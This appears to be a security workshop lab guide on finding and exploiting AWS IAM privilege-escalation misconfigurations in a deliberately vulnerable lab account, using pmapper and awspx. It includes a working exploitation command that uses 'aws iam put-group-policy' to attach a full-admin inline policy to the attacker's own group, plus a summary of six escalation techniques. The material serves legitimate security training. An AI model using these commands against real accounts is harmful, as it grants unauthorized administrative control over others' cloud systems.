# Lab 1 - Layin' Down the Law: Identifying and Exploiting IAM Misconfigurations

**Duration:** 45 minutes

## Overview

In this lab, you'll use open source tools to discover and exploit privilege escalation vulnerabilities in AWS IAM. This hands-on experience demonstrates why IAM misconfigurations are consistently ranked among the top cloud security risks.

**What You'll Learn:**
- IAM privilege escalation strategies and what makes them possible
- How attackers use tools like **pmapper** to automatically discover IAM vulnerabilities
- How to visualize IAM relationships using **awspx**
- How to exploit six distinct privilege escalation paths—each with a **different root cause**

---

## Environment Set Up

## Step 1: Configure AWS Credentials

Paste the `export` commands provided by the workshop facilitator into your terminal session:

```bash
export AWS_ACCESS_KEY_ID=AKIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...
```

Verify the credentials are working:

```bash
aws sts get-caller-identity
```

Expected output looks similar to the following:

```
{
    "UserId": "<Your user id>",
    "Account": "<your account id>",
    "Arn": "<your identity arn>"
}
```

---

## Step 2: Clone the Workshop Repository

```bash
git clone https://github.com/TaraScho/ws-wrangling-identity-and-access-in-aws.git ~/workshop
cd ~/workshop
```

---

## Step 3: Run the Setup Script

```bash
bash labs/wwhf-setup.sh
```

The script will:

1. Verify prerequisites (Docker, Python 3, AWS credentials, etc.)
1. Install Terraform and pmapper
1. Create the awspx credential wrapper
1. Add tools to your PATH
1. Deploy the vulnerable lab infrastructure with Terraform
1. Configure AWS CLI profiles for all 6 exercise users

When the script finishes, you should see:

```
=== Setup Complete! (4/4 checks passed) ===

You're ready to start Lab 1. Happy hacking!
```

## Step 4: 🚨 IMPORTANT

The setup script added tools to your PATH, but your current terminal session needs to reload it:

```bash
source ~/.bashrc
```

---

## Privilege Escalation Categories

Throughout this workshop, we will reference [pathfinding.cloud](https://pathfinding.cloud), an open source knowledge store dedicated to understanding, detecting & demonstrating AWS IAM Privilege Escalation. We'll start by exploring the Privilege Escalation Library and understanding the categories used to 

1. Navigate to [pathfinding.cloud](https://pathfinding.cloud) in your browser.

1. Open the **Privilege Escalation Library**.

1. Note the drop-down menu to filter by **CATEGORY**. As of writing these instructions, pathfinding.cloud organizes privilege escalation paths into five categories.

| Category              | Description                                 |
|-----------------------|---------------------------------------------|
| **Self-Escalation**   | Modify your own permissions directly to escalate privileges
| **Principal Access**  | Gain access to a different principal to escalate privileges       |
| **New PassRole**      | Create a new resource (EC2, Lambda, etc.) and pass a privileged role to it |
| **Existing PassRole** | Modify an existing resource with an attached role and gain access to that role     |
| **Credential Access** | Access to hardcoded credentials stored insecurely        |

In this lab, you'll exploit vulnerabilities from several of these categories.

Take a moment to explore the different categories in pathfinding.cloud. You can click on each path to see a description and attack visualization. 

---

## Exercise 1: Building Your IAM Intelligence

Now that you are familiar with general privilege escalation techniques, it's time to find find out what IAM vulnerabilities exist in your lab AWS account. You will use two open source pentesting tools to do reconnaissance on the lab AWS account and find the juciest IAM vulnerabilities to exploit.

- **pmapper** (Principal Mapper): Builds a graph of IAM principals and analyzes privilege escalation paths
- **awspx**: Visualizes IAM relationships as an interactive graph and is a great tool for high-level review of effective access paths between users, roles, and resources.

> [!NOTE]
> In addition to the tools you will use in this lab, there are several well known AWS pentesting tools useful for IAM privilege escalation. The **OSS DETECTION** field on pathfinding.cloud shows you which existing open source tools can detect a given attack path.

### Part A: Create the pmapper Graph

pmapper works by first building a "graph" of your AWS account's IAM configuration. This graph captures all users, roles, groups, and their permissions.

> [!NOTE]
> **What permissions does pmapper need?** pmapper makes read-only AWS API calls to build its graph — `iam:List*` and `iam:Get*` actions across users, roles, groups, and policies. It also calls `sts:GetCallerIdentity` and checks for Organizations SCPs. The AWS managed policy **ReadOnlyAccess** is sufficient. pmapper never modifies your account — it only reads configuration data to build a local graph model.

1. **Create the IAM graph:**
   ```bash
   pmapper graph create --include-regions us-east-1 us-east-2 us-west-1 us-west-2
   ```

   Example output (partial):

   ```
    2026-02-06 18:45:12-0700 | Sorting users, roles, groups, policies, and their relationships.
    2026-02-06 18:45:12-0700 | Obtaining Access Keys data for IAM users
    2026-02-06 18:45:13-0700 | Gathering MFA virtual device information
    2026-02-06 18:45:13-0700 | Gathering MFA physical device information
    2026-02-06 18:45:13-0700 | Determining which principals have administrative privileges
    2026-02-06 18:45:13-0700 | Initiating edge checks.
    2026-02-06 18:45:13-0700 | Generating Edges based on EC2 Auto Scaling.
    ```

   This command:
   - Enumerates all IAM users, roles, and groups
   - Retrieves all attached and inline policies
   - Analyzes trust relationships between principals
   - Takes 1-2 minutes to complete

   `pmapper graph create` saves a serialized graph data store to a platform-specific directory such as `~/.local/share/principalmapper` on Linux
   
   When it finishes running you will see a summary similar to the following:

    ```
    Graph Data for Account:  <account ID>
    # of Nodes:              45 (11 admins)
    # of Edges:              38
    # of Groups:             2
    # of (tracked) Policies: 52
    ```

    You can redisplay this graph summary any time with 

    ```
    pmapper graph display
    ```

   In the example above `11 admins` tells you how many principals have administrative access—these are high-value targets for attackers.

### Part B: Run Privilege Escalation Analysis

Now use pmapper to automatically find privilege escalation paths:

```bash
pmapper analysis --output-type text
```

**What to look for:** Scan the output for users starting with `iamws-`. These are the intentionally vulnerable principals we'll explore. The following are a few examples of what you will see in the pmapper output.

```
* user/iamws-ci-runner-user can escalate privileges by accessing the
  administrative principal role/iamws-prod-deploy-role:
   * user/iamws-ci-runner-user can use EC2 to run an instance with an
     existing instance profile to access role/iamws-prod-deploy-role

* user/iamws-role-assumer-user can escalate privileges by accessing
  the administrative principal role/iamws-privileged-admin-role:
   * user/iamws-role-assumer-user can access via sts:AssumeRole
     role/iamws-privileged-admin-role

* user/iamws-lambda-developer-user can escalate privileges by accessing
  the administrative principal role/iamws-privileged-lambda-role:
   * user/iamws-lambda-developer-user can use Lambda to edit an existing
     function to access role/iamws-privileged-lambda-role
```

**Key insight:** pmapper automatically identified that low-privilege users can reach administrative principals. An attacker with access to any of these users could compromise the entire account.

### Part C: Load Data into awspx

awspx also provides a visual way to explore IAM relationships. awspx renders an **interactive graph** so you can visually trace how users, roles, groups, and policies connect—and where attack paths exist. It's already running at [http://localhost:10000](http://localhost:10000).

> **Note:** The workshop setup script maps awspx to port 10000. If you installed awspx on your own machine outside of this workshop, it runs on port 80 by default.

1. **Ingest AWS IAM data:**
   ```bash
   awspx ingest --env --region us-east-1
   ```

   Similar to pmapper, this command pulls IAM data into awspx's graph database (Neo4j).

1. **Open awspx** in your browser at [http://localhost:10000](http://localhost:10000)

   You'll see an empty canvas with a **search bar** at the bottom and a **toolbar** on the right side.

1. **Visualize the privesc path:** pmapper already told you that `iamws-group-admin-user` can escalate to admin. Now let's use awspx **Advanced Search**, which finds paths between any two resources in the graph.

   a. Click the **filter icon** (the sliders icon to the right of the search bar) to open the **Advanced Search** panel. You'll see **From** and **To** fields, a **Mode** section, and a query editor at the bottom.

   b. Click into the **From** field and type `iamws-group-admin-user`. A dropdown appears — you'll see several similarly-named resources (`iamws-group-admin-policy`, `iamws-group-admin-role`, `iamws-group-admin-user`). Make sure you select the **user** — the one ending in `-user`.

   c. Click into the **To** field and type `Effective Admin`. Select it from the dropdown.

      **What is "Effective Admin"?** This is a pseudo-node that awspx creates automatically during data ingestion. It represents the goal of a privilege escalation attack: full administrative access (`Action: *, Resource: *`).

   d. Look at the query editor at the bottom of the panel. awspx auto-generated a [Cypher](https://neo4j.com/docs/cypher-manual/current/introduction/) query:
      ```
      MATCH Paths=ShortestPath((Source)-[:TRANSITIVE|ATTACK*0..]->(Target))
      WHERE ID(Source) IN [<your node ID>]
      AND ID(Target) IN [<your node ID>]
      RETURN Paths LIMIT 500
      ```

      You don't need to understand Cypher syntax to use awspx, but the key part is `TRANSITIVE|ATTACK` — this tells awspx to follow both **transitive edges** (IAM relationships like "user is member of group" or "policy is attached to role") *and* **attack edges** (computed privilege escalation paths) when searching for a route between the two nodes.

   e. Click the **Run** button (▶) at the bottom-right of the Advanced Search panel.

1. **See the attack path:**

   The result renders behind the Advanced Search panel. Click anywhere on the canvas background to dismiss the search panel and reveal the graph.

   You should now see two nodes connected by a **maroon dashed edge**:

   - **`iamws-group-admin-user`** (red person icon) — the source principal (IAM user)
   - **`Effective Admin`** (crown icon) — the target representing full administrative access
   - A **maroon dashed line** connecting them — an **attack edge**

   awspx displays three types of edges in its graph. You're looking at one now — understanding all three will help you read the graphs throughout this lab:

   - **Transitive edges** (solid lines) — IAM relationships that connect resources: group membership, policy attachment, role trust. These are the "plumbing" of IAM.
   - **Action edges** (labeled gradient-colored lines) — Individual resolved IAM permissions, like `s3:GetObject` or `iam:PutGroupPolicy`. These show what a principal is allowed to *do*.
   - **Attack edges** (maroon dashed lines) — Computed privilege escalation paths. awspx analyzes the transitive edges and action edges together and determines that a principal can chain permissions to escalate privileges. The attack edge you see now means awspx has found a viable escalation path from this user to full admin.

1. **Explore the node**

   Before we look at the attack itself, let's orient ourselves with the tool. Click on the **`iamws-group-admin-user`** node. A properties panel opens at the top of the screen with several tabs. Click through each one:

   - **AWS::Iam::User** — Basic identity info: the user's name, ARN, creation date, and IAM ID.
   - **AccessKeys** — Any access keys associated with this user.
   - **GroupList** — The IAM groups this user belongs to. You should see **`iamws-dev-team`** listed here. 
   - **Notes** — An working area for you to add any notes you want to keep about this principal

   Now click anywhere on the canvas background to dismiss the panel.

1. **Explore IAM relationships — right-click the node:**

   Right-click on the **`iamws-group-admin-user`** node. A context menu appears with four buttons around the node. Hover over each button to see what it is.

   - **Outbound Paths** — transitive and attack edges going *from* this node
   - **Outbound Actions** — specific IAM permissions this principal has
   - **Inbound Paths** — transitive and attack edges coming *to* this node
   - **Inbound Actions** — specific IAM permissions targeting this principal

   Click **Outbound Paths**. The graph expands to show the resources connected to this user:

   - **`iamws-group-admin-policy`** (policy icon) — connected by a solid **transitive edge** labeled "Attached". This is the IAM policy attached to the user that grants the `iam:PutGroupPolicy` permission.
   - **`iamws-dev-team`** (group icon) — connected by a solid **transitive edge** labeled "Attached". This is the IAM group the user belongs to — and the target the attacker will write an admin policy on.
   - **`Effective Admin`** (crown icon) — connected by the maroon dashed **attack edge** labeled "PutGroupPolicy".

   Now you can see the complete story: the user has a policy granting `PutGroupPolicy`, they belong to `iamws-dev-team`, and awspx has determined they can exploit that combination to reach admin. The transitive edges show *how IAM resources are connected*, and the attack edge shows *what an attacker can do with those connections*.

   Click anywhere on the canvas to dismiss any open panels before continuing.

1. **Discover the exploit — click the attack edge:**

   Click directly on the **maroon dashed line** (the attack edge) between the two nodes. A panel opens at the top-left with two tabs: **Attack Path** and **Notes**.

   The **Attack Path** tab shows you the exact exploitation command:
   ```bash
   aws iam put-group-policy \
     --group-name iamws-dev-team \
     --policy-name Admin \
     --policy-document file://<(cat <<EOF
   {
       "Version": "2012-10-17",
       "Statement": [
           {
               "Sid": "Admin",
               "Effect": "Allow",
               "Action": "*",
               "Resource": "*"
           }]
   }
   EOF
   )
   ```

   awspx is telling you that `iamws-group-admin-user` can call `iam:PutGroupPolicy` to write an inline admin policy on the group `iamws-dev-team`. Since this user is a *member* of that group, the new policy immediately grants them full admin access.

   This is the entire attack plan — laid out by a tool, from a single graph query. Now you are ready to escalate privileges.

---

## Exercises

**The exercise pattern:** For each of the remaining exercises, you'll follow the same workflow: **(1)** visualize the attack path in awspx, **(2)** confirm the vulnerability with pmapper, **(3)** review the attack conceptually on pathfinding.cloud, and **(4)** exploit it. You've already completed the awspx visualization for the next excercise, so the instructions will jump straight to pmapper.

> **NOTE:**
> Most excercises have instructions for both awspx and pmapper, which is in many cases redundant, but will familiarize you with both tools. Feel free to focus on one tool if you prefer.
>
> Some excercises only have instructions for pmapper.

1. [Exercise 2: PutGroupPolicy](exercises/exercise-2.md) — Self-escalation via group policy injection
1. [Exercise 3: CreatePolicyVersion](exercises/exercise-3.md) — Self-escalation via policy version manipulation
1. [Exercise 4: AssumeRole](exercises/exercise-4.md) — Principal access via permissive trust policy
1. [Exercise 5: PassRole + EC2](exercises/exercise-5.md) — Privilege escalation via new PassRole
1. [Exercise 6: UpdateFunctionCode](exercises/exercise-6.md) — Privilege escalation via existing PassRole
1. [Exercise 7: GetFunctionConfiguration](exercises/exercise-7.md) — Credential access via Lambda environment variables

---

## Wrap-up

### What You Accomplished

In this lab, you:
1. Built an IAM graph using pmapper and identified privilege escalation paths
1. Explored IAM relationships visually with awspx
1. Exploited **six distinct privilege escalation vulnerabilities**, each with a **different root cause**:

| Exercise | Attack | Category | Root Cause |
|----------|--------|----------|------------|
| 2 | PutGroupPolicy | Self-Escalation | Can write inline policies on own group (no resource constraint) |
| 3 | CreatePolicyVersion | Self-Escalation | Can modify policy attached to self |
| 4 | AssumeRole | Principal Access | Trust policy trusts account root |
| 5 | PassRole + EC2 | New PassRole | Missing iam:PassedToService condition |
| 6 | UpdateFunctionCode | Existing PassRole | Can modify any Lambda (no resource constraint) |
| 7 | GetFunctionConfiguration | Credential Access | Secrets in plaintext env vars 

---

## Optional: Additional pmapper Queries

Explore more of pmapper's query capabilities:

```bash
# Who can become admin?
pmapper query "who can do iam:* with *"

# Can a specific user reach admin?
pmapper query "can user/iamws-ci-runner-user do s3:* with *"

# Who can pass a specific role?
pmapper query "who can do iam:PassRole with arn:aws:iam::*:role/iamws-prod-deploy-role"

# List all privesc paths
pmapper analysis --output-type text

# Visualize the graph (requires graphviz)
pmapper visualize
```
